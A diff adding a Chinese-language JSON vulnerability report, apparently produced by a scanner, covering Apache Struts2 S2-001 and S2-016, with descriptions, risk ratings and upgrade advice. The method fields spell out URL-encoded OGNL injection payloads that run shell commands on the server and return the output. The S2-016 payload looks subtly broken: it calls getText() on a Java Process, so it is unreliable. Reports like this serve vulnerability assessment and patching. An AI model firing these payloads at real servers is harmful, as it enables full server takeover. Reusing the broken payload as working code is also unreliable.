@@ -1,0 +1,16 @@
+[
+    {
+        "vuln_name": "S2_001",
+        "vuln_desc": "Apache Struts2 S2-001远程代码执行漏洞，攻击者可以通过构造恶意的OGNL表达式，实现命令执行，从而完全控制服务器。",
+        "method": "利用此漏洞，攻击者可以向`http://127.0.0.1:8080/login.action`发送精心构造的请求，其中包含恶意的payload。例如，通过替换`{cmd}`为想要执行的命令，如`whoami`，构造的Payload为：%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B'whoami'%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D。成功利用后，服务器将返回命令执行的结果。",
+        "vuln_risk": "极高风险，可能导致服务器被完全控制，数据泄露或服务中断。",
+        "vuln_fix": "立即升级Apache Struts2到不受影响的版本，并确保应用层面有输入验证和过滤机制，以防止恶意输入。同时，建议采用最小权限原则配置服务器和应用环境，减少潜在损害。"
+    },
+    {
+        "vuln_name": "S2_016",
+        "vuln_desc": "Apache Struts2 S2-016远程命令执行漏洞，攻击者可利用错误处理机制中的重定向功能执行任意URL，可能包括恶意构造的URL导致代码执行。",
+        "method": "针对此漏洞，攻击者可能尝试通过修改重定向参数，如`redirect:$%7B%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=false%2C%23_memberAccess[%22allowStaticMethodAccess%22]=true%2C@java.lang.Runtime@getRuntime().exec(%22whoami%22).getText()%7D`来触发命令执行。但注意，提供的扫描结果显示payload为`None`，意味着直接利用此poc可能不直接导致命令执行，需进一步分析具体场景。",
+        "vuln_risk": "高风险，可能被用于信息泄露、进一步的攻击跳板或在特定环境下执行恶意代码。",
+        "vuln_fix": "升级Struts2框架至安全版本，禁用或严格限制动态方法调用特性，并确保所有用户输入都经过严格的验证与清理。同时，监控并审计所有重定向和转发逻辑，避免未授权的重定向操作。"
+    }
+]
